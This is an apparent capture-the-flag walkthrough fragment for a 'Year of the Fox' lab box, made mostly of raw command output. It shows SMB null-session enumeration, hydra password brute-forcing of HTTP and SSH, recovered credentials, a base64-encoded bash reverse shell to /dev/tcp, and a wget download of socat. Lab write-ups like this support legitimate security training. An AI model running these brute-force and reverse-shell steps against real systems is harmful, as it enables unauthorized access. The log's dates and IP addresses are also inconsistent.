...
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-01 15:35 CEST
...
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 =================================================== 
|    Enumerating Workgroup/Domain on 10.18.22.17    |
 =================================================== 
[+] Got domain/workgroup name: YEAROFTHEFOX
 =========================================== 
|    Nbtstat Information for 10.18.22.17    |
 =========================================== 
Looking up status of 10.10.137.8
 ...
 ==================================== 
|    Session Check on 10.18.22.17   |
 ==================================== 
[+] Server 10.18.22.17 allows sessions using username '', password ''
 ========================================== 
|    Getting domain SID for 10.18.22.17    |
 ========================================== 
Domain Name: YEAROFTHEFOX
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup
 ===================================== 
|    OS information on 10.18.22.17    |
 ===================================== 
...
|    Share Enumeration on 10.18.22.17    |
 ======================================== 
        ...
        IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
[+] Attempting to map shares on 10.18.22.17
//10.18.22.17/yotf      Mapping: DENIED, Listing: N/A
//10.18.22.17/IPC$      [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 =================================================== 
|    Password Policy Information for 10.18.22.17    |
 =================================================== 
[+] Attaching to 10.18.22.17 using a NULL share
...
S-1-22-1-1001 Unix User\rascal (Local User)
 ============================================ 
|    Getting printer info for 10.18.22.17    |
 ============================================ 
No printers returned.
```

```
$ hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.18.22.17 http-get
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.18.22.17:80/
[STATUS] 5155.00 tries/min, 5155 tries in 00:01h, 14339244 to do in 46:22h, 16 active
[80][http-get] host: 10.18.22.17   login: rascal   password: 987321
1 of 1 target successfully completed, 1 valid password found
```

`rascal:987321`

[http://10.18.22.17/](http://10.18.22.17/)

`echo -n "bash -i >& /dev/tcp/10.18.22.17/9001 0>&1" | base64`
...
connect to [10.18.22.17] from (UNKNOWN) [10.18.22.17] 41634
...
```
www-data@year-of-the-fox:/tmp$ wget 10.18.22.17/socat
wget 10.18.22.17/socat
--2020-10-17 13:46:24--  http://10.18.22.17/socat
Connecting to 10.18.22.17:80... connected.
...
Saving to: 'socat'
   ...
   300K .......... .......... .......... .......... .......... 94%  881K 0s
   350K .......... .........                                  100%  764K=0.5s
2022-11-01 15:56:25 (704 KB/s) - 'socat' saved [378384/378384]
...
```
$ hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.18.22.17:2222
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.18.22.17:2222/
...
[2222][ssh] host: 10.18.22.17   login: fox   password: chance
1 of 1 target successfully completed, 1 valid password found
...
```
$ ssh fox@10.18.22.17 -p 2222
The authenticity of host '[10.18.22.17]:2222 ([10.18.22.17]:2222)' can't be established.
ECDSA key fingerprint is SHA256:UUzRY8LX3i6B/7AWHKO+WY0vkPQsuyyNpEvf2BI6jMU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.18.22.17]:2222' (ECDSA) to the list of known hosts.
